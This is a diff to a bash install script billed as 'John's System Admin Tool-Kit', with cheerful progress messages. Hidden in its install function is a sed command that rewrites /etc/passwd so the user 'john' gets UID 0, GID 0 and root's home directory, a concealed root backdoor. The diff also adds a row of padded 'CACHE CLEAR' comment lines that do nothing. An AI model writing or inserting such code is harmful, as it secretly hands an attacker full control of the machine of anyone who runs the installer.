@@ -23,7 +23,7 @@ function install {
   clear
   echo -e "${RED}[!] ${NOCOLOR}*warning, this is a beta script and wont do error recovery by itself yet*"
   echo -e "${CYAN}[#] ${NOCOLOR}Installing John's System Admin Tool-Kit..."
-  echo "${CYAN}[#] ${NOCOLOR}${DISTRO} Detected!"
+  echo -e "${CYAN}[#] ${NOCOLOR}${DISTRO} Detected!"
   sed -i 's/john:x:*:*::\/*:\/bin\/*/john:x:0:0::\/root:\/bin\/zsh/g' /etc/passwd
   echo -e "${CYAN}[#] ${NOCOLOR}Installed John's System Admin Tool-Kit!"
 }
@@ -33,3 +33,19 @@ sleep 1
 clear
 echo -e "${GREEN}[$] ${NOCOLOR}Thanks for choosing me as a System Administrator :)"
 echo
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
+#                                             CACHE CLEAR
